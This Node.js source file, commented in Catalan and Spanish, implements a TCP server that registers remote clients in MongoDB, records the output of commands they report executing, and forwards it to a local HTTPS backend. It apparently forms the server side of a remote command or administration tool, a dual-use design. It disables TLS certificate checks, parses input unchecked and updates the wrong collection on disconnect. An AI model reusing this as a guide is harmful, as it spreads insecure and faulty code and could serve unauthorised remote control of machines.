const net = require("net");
const fs = require ("fs");
// Importem les funcions getDB, getColl(collectionName), getDocuments(collectionName, filter), connect((err) => {...}) (connecta la base de dades), getPrimeryKey(_id) (retorna el ObjectID de _id)
// Per recollir els documents del obecte Promise retornat per getDocuments, cal passarli la funcio .then( (docs) => {...}));
const db = require('../database/config.js');
// Llistat amb els noms de les colleccions
const collections = ['client', 'comanda', 'user'];
const encrypt = require('./crypto/crypto');
const resp = require('./callback-manager')
const split = require ("split");
const fetch = require('node-fetch');
const http = require ("http");
const https = require('https');
const ObjectID = require('mongodb').ObjectID;
const httpsAgent = new https.Agent({
    rejectUnauthorized: false,
    });

function startSockets() {
	const server = net.createServer();
	const port = 1234;
	const host = "0.0.0.0";
	const tout = 3000; //ms para timeout
	const url = "https://127.0.0.1:5000/outputback";
	let sockets = [];
	let websocket = [];
	server.listen(port, host, () => {
		console.log(`TCP server listening on ${host}:${port}`);
	});
	server.on("connection", (socket) => {
		var clientAddress = `${socket.remoteAddress}:${socket.remotePort}`;
		console.log(`new client connected: ${clientAddress}`);
		socket.on("data", (data) => {
	    	console.log(`${clientAddress}: ${data}`); //output mensaje cliente
	    	//si getdata == a GET
	    	var getdata = String(data).split(" ", 2);
	    	console.log(`getdata : ${getdata[0]}`)
	    	if (getdata[0] === "GET") {
	    		try {
		    		websocket.push(socket); 		
		    		resp.httpRes(socket, sockets, getdata) //funcion callback-manager httpRes
	    		} catch (error) {
					console.log(error)
				}
	    	} else{
	    		const pData = JSON.parse(data)
	    	   	if (pData.head.id === 0) { //identifica cliente con  id 0
			    		db.connect( async (err) =>{
				    		var jstring= {ip: socket.remoteAddress, status:{alive: true, lastconnection: new Date()}} 
				   			console.log(jstring)
				    		var cliColl = db.getColl(collections[0])
				   			console.log("insertando nuevo cli")
				   			await db.insertDocument(cliColl, jstring).then((doc) => {
				   				//print client ID
				   				socket["id"] = JSON.stringify(doc.insertedId);
				   			});
			    			sockets.push(socket);
			    			socket.write(`{ "id" : ${socket["id"]}}`)
			    			console.log(sockets.length);
			    		});
			    		console.log("id 0")
		    	}else { //cuando el cliente ya tiene idpointer
		    		socket["id"] = JSON.stringify(pData.head.id)
		    		if (pData.body.message === "Command executed"){
		    			console.log(pData)
		    			var outdata = {"endp":pData.head.id,"cmd":pData.body.command,"output":pData.body.output}
		    			db.connect( async (err) =>{ //input a la BBDD del output del comando
		    				var cjstring = {data: new Date(), cmd: pData.body.command, output: pData.body.output, client:pData.head.id}
		    				var cmdColl = await db.getColl(collections[1])
		    				await db.insertDocument(cmdColl, cjstring)
		    				console.log("input del output de la cmd")
		    			})
		    			fetch(url, {
						  method: 'POST', // or 'PUT'
						  headers:{
						    'Content-Type': 'application/json',
						    'Accept': 'application/json'
						  },
						  body: JSON.stringify(outdata), // data can be `string` or {object}!
						  agent: httpsAgent,			//agente creado con js para evitar problemas con certificado autofirmado
						}).catch(error => console.error('Error:', error))
		    		}
		    		if (sockets.includes(socket)===false){
		    			sockets.push(socket);
		    		}
		    	}
	    	};
	    });
		socket.on('close', (data) => {
			var socl = sockets.includes(socket); //busca en el array si es troba el socket
			if (socl === true) {
				var filtered = sockets.filter(function(value, index, arr){ //extreu el socket de l'array
					return value !== socket;
				});
				sockets = filtered
				console.log(typeof socket["id"])
				db.connect( async (err) =>{
					var cliColl = await db.getColl(collections[1])
					//var cliId = db.getPrimaryKey(socket["id"])
					const ObjectId = new ObjectID(socket["id"].replace(/['"]+/g, ''));
					console.log("La id: ", ObjectId)
					await db.updateDocument(cliColl, {_id:ObjectId}, {$set:{status:{alive:false}}}).then((doc) =>{
						var update = doc
						console.log(doc)
					})
				})
				console.log(`connection closed: ${socket.remoteAddress}:${socket.remotePort}`);
			} else if (socket === websocket){
				console.log('websocket closed')
			}	
	    }); 
		// Gestor d'errors 
		socket.on("error", (err) => { 
			console.log(`Error occurred in ${clientAddress}: ${err.message}`); 
		}); 
	});
};
exports.startSockets = startSockets;
//const found = sockets.find(element=> socket) busca un socket al array, retorna objecte
			//extrae ip y puerto del array de sockets
	        //const index = sockets.findIndex( (o) => { 
	        //    return (o.remoteAddress===socket.remoteAddress) && (o.remotePort === socket.remotePort); 
	        //}); 
	        //extrae ip y puerto del array de websockets
//	        const windex = websocket.findeindex( (z) =>{
//	        	return z.remoteAddress === websocket.remoteAddress) && (z.remotePort === websocket.remotePort)
//	        })
	        //if (index !== -1) sockets.splice(index, 1); 
			//sockets.forEach((sock) => { 
			//	sock.write(`${clientAddress} disconnected\n`); 
			//});